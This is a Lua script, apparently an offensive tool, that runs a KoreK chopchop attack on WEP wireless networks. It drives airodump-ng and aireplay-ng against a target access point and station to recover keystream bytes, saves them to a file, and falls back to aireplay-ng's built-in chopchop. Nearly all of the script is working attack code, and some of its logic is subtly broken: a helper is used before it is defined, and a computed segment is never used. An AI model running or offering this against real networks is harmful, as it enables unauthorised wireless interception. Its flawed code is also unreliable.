local iface = arg[1]
local bssid = arg[2]
local station = arg[3]
local output_xor = arg[4] or "/tmp/prga_xor.bin"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function capture_encrypted_packet()
  telemetry("capture_start", '{"target":' .. json_escape(bssid) .. '}')
  local capfile = "/tmp/wep_capture_" .. iface .. ".pcap"
  local cmd = "airodump-ng -c 1 --bssid " .. bssid .. " -w " .. capfile:gsub("%.pcap$", "") .. " " .. iface .. " --output-format pcap &"
  os.execute(cmd)
  os.execute("sleep 5")
  os.execute("killall airodump-ng 2>/dev/null")
  local f = io.open(capfile, "rb")
  if not f then
    telemetry("error", '{"error":"Failed to capture any packets"}')
    return nil
  end
  local data = f:read("*a")
  f:close()
  telemetry("capture_done", '{"size":' .. tostring(#data) .. ',"file":' .. json_escape(capfile) .. '}')
  return data
end

local function extract_encrypted_payload(pcap_data)
  if not pcap_data or #pcap_data < 40 then return nil end
  local wireless_offset = 24
  local llc_offset = wireless_offset + 24
  local data_offset = llc_offset + 8
  local payload = pcap_data:sub(data_offset + 1)
  if #payload < 60 then
    telemetry("payload_small", '{"size":' .. tostring(#payload) .. ',"expected_min":60}')
    return nil
  end
  local encrypted_data = payload:sub(5)
  local icv = payload:sub(#payload - 3)
  telemetry("payload_extracted", '{"encrypted_len":' .. tostring(#encrypted_data) .. ',"icv":' .. json_escape(hex_bytes(icv)) .. '}')
  return encrypted_data, icv
end

local function hex_bytes(s)
  if not s then return "" end
  local out = {}
  for i = 1, #s do
    out[#out + 1] = string.format("%02x", string.byte(s, i))
  end
  return table.concat(out, ":")
end

local function korek_chopchop(encrypted_data)
  if not encrypted_data or #encrypted_data < 8 then
    telemetry("error", '{"error":"Encrypted data too short for chopchop"}')
    return nil
  end

  telemetry("chopchop_start", '{"data_len":' .. tostring(#encrypted_data) .. '}')
  local data = {string.byte(encrypted_data, 1, #encrypted_data)}
  local last_byte = data[#data]
  local truncated = {}
  for i = 1, #data - 1 do
    truncated[i] = data[i]
  end
  local guess_byte = 0xaa
  local prga_byte = guess_byte ~ last_byte
  truncated[#truncated + 1] = guess_byte
  local mod_data = ""
  for _, b in ipairs(truncated) do
    mod_data = mod_data .. string.char(b)
  end

  local tmp = "/tmp/chop_frame_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then
    telemetry("error", '{"error":"Cannot write temp file"}')
    return nil
  end
  f:write(mod_data)
  f:close()

  local cmd = "aireplay-ng -D -x 1 " .. iface .. " < " .. tmp .. " 2>/dev/null"
  local p = io.popen(cmd)
  if p then
    while true do
      local line = p:read("*l")
      if not line then break end
      if line:find("ack") or line:find("ACK") then
        telemetry("chop_ack", '{"byte_pos":' .. tostring(#data) .. ',"prga_byte":"' .. string.format("%02x", prga_byte) .. '"}')
        p:close()
        return prga_byte, mod_data
      end
    end
    p:close()
  end
  telemetry("chop_noack", '{"byte_pos":' .. tostring(#data) .. '}')
  return nil
end

local function perform_chopchop_attack()
  local pcap_data = capture_encrypted_packet()
  if not pcap_data then
    telemetry("error", '{"error":"No captured data, trying aireplay-ng chopchop directly"}')
    os.execute("aireplay-ng --chopchop -a " .. bssid .. " -h " .. station .. " " .. iface .. " 2>/dev/null")
    return
  end
  local enc_data = extract_encrypted_payload(pcap_data)
  if not enc_data then
    telemetry("error", '{"error":"Could not extract encrypted payload, falling back to aireplay-ng"}')
    os.execute("aireplay-ng --chopchop -a " .. bssid .. " -h " .. station .. " " .. iface .. " 2>/dev/null")
    return
  end

  local prga_bytes = {}
  local success_count = 0
  local target_bytes = math.min(#enc_data, 32)

  for pos = 1, target_bytes do
    local enc_segment = enc_data:sub(1, #enc_data - pos + 1)
    local prga = korek_chopchop(enc_data)
    if prga then
      prga_bytes[#prga_bytes + 1] = prga
      success_count = success_count + 1
      telemetry("prga_progress", '{"byte":' .. tostring(pos) .. ',"prga":"' .. string.format("%02x", prga) .. '","total":' .. tostring(success_count) .. '}')
      enc_data = enc_data:sub(1, #enc_data - 1)
    else
      telemetry("chop_retry", '{"byte":' .. tostring(pos) .. ',"error":"No ACK, skipping"}')
    end
  end

  local prga_str = ""
  for _, b in ipairs(prga_bytes) do
    prga_str = prga_str .. string.char(b)
  end

  local out = io.open(output_xor, "wb")
  if out then
    out:write(prga_str)
    out:close()
    telemetry("prga_saved", '{"file":' .. json_escape(output_xor) .. ',"bytes":' .. tostring(#prga_str) .. '}')
  end

  telemetry("chopchop_complete", '{"extracted_bytes":' .. tostring(success_count) .. ',"target_bytes":' .. tostring(target_bytes) .. ',"output":' .. json_escape(output_xor) .. '}')
end

if not iface or not bssid or not station then
  telemetry("error", '{"error":"Usage: wep_chopchop.lua <iface> <bssid> <station> [output_xor]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Interface not in monitor mode"}')
  os.exit(1)
end

local ok, err = pcall(perform_chopchop_attack)
if not ok then
  telemetry("error", '{"error":"Chopchop failed: ' .. json_escape(tostring(err)) .. '"}')
  os.execute("aireplay-ng --chopchop -a " .. bssid .. " -h " .. station .. " " .. iface .. " 2>/dev/null")
end

telemetry("complete", '{"bssid":' .. json_escape(bssid) .. '}')
